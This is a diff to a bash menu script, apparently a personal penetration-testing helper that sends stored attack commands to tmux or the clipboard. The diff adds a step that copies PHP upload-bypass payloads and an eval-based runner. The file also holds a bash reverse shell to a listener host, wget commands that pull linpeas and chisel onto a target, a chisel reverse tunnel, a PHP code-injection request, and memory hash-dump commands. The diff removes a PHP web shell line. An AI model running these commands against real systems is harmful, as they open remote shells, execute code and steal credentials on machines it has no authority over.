@@ -74,6 +74,8 @@ COMMAND_t1="haiti HASH"
 COMMAND_t2="python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP"
 COMMAND_t3="python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD"
 
+COMMAND_p1="cp -R ~/Hacking/Tools/PayloadsAllTheThings/Upload\ Insecure\ Files/Extension\ PHP ./php"
+
 COMMAND_f1='volatility -f $MEM_FILE imageinfo | tee -i mem-info.txt | highlight "Suggested Profile\(s\) : .*"'
 COMMAND_f2='volatility -f $MEM_FILE hivelist --profile=$MEM_PROFILE | highlight "0x\S.*(SYSTEM|SAM)"'
 COMMAND_f3='volatility -f $MEM_FILE hashdump --profile=$MEM_PROFILE > key.hash'
@@ -91,13 +93,12 @@ LINK_5="https://gchq.github.io/CyberChef/"
 CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
 CLIP_2="export TERM=xterm"
 CLIP_3="stty raw -echo; fg"
-CLIP_4="<?php system($_GET[\"c\"]); ?>"
-CLIP_5="bash -i >& /dev/tcp/${LHOST}/4444 0>&1"
-CLIP_6="wget -O /tmp/handyman http://${LHOST}:8000/handyman_cp"
-CLIP_6="wget -O /tmp/linpeas.sh http://${LHOST}:8000/linpeas.sh"
-CLIP_7="wget -O /tmp/chisel http://${LHOST}:8000/chisel"
-CLIP_8="/tmp/chisel client ${LHOST}:9999 R:${LHOST}:8888:127.0.0.1:[OPEN_PORT]"
-CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://${RHOST}/index.php?page=php://input%00\" -k -v"
+CLIP_4="bash -i >& /dev/tcp/${LHOST}/4444 0>&1"
+CLIP_5="wget -O /tmp/handyman http://${LHOST}:8000/handyman_cp"
+CLIP_5="wget -O /tmp/linpeas.sh http://${LHOST}:8000/linpeas.sh"
+CLIP_6="wget -O /tmp/chisel http://${LHOST}:8000/chisel"
+CLIP_7="/tmp/chisel client ${LHOST}:9999 R:${LHOST}:8888:127.0.0.1:[OPEN_PORT]"
+CLIP_8="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://${RHOST}/index.php?page=php://input%00\" -k -v"
 
 LOCAL_="${ORANGE}$(whoami)@${LHOST}${NOCOLOR}"
 REMOTE_="${RED}$``USER@${RHOST}${NOCOLOR}"
@@ -175,6 +176,10 @@ show_menus() {
   echo -e "  ${YELLOW}t2${NOCOLOR}) $COMMAND_t2"
   echo -e "  ${YELLOW}t3${NOCOLOR}) $COMMAND_t3"
   echo -e ""
+  echo -e "  ${LIGHTGREEN}Payloads${NOCOLOR}"
+  echo -e "  --------"
+  echo -e "  ${YELLOW}p1${NOCOLOR}) PHP payload"
+  echo -e ""
   echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
   echo -e "  -----"
   echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
@@ -207,7 +212,6 @@ show_menus() {
   echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
   echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
   echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
-  echo -e "  ${YELLOW}c9${NOCOLOR}) $CLIP_9"
   echo -e ""
   echo -e "  (${YELLOW}o${NOCOLOR})pen. Open split"
   echo -e "  e(${RED}x${NOCOLOR})it. Exit"
@@ -307,6 +311,10 @@ runV() {
 
   C="$@"
   tmux send-keys "$C"
+}
+
+runE() {
+  eval "$@"
 }
 
 runCat () {
@@ -441,6 +449,8 @@ read_options() {
     t2) runV $COMMAND_t2;;
     t3) runV $COMMAND_t3;;
 
+    p1) runE $COMMAND_p1;;
+
     l1) openLink $LINK_1;;
     l2) openLink $LINK_2;;
     l3) openLink $LINK_3;;
@@ -465,7 +475,6 @@ read_options() {
     c6) runC $CLIP_6;;
     c7) runC $CLIP_7;;
     c8) runC $CLIP_8;;
-    c9) runC $CLIP_9;;
 
     o) openSplit;;
     open) openSplit;;
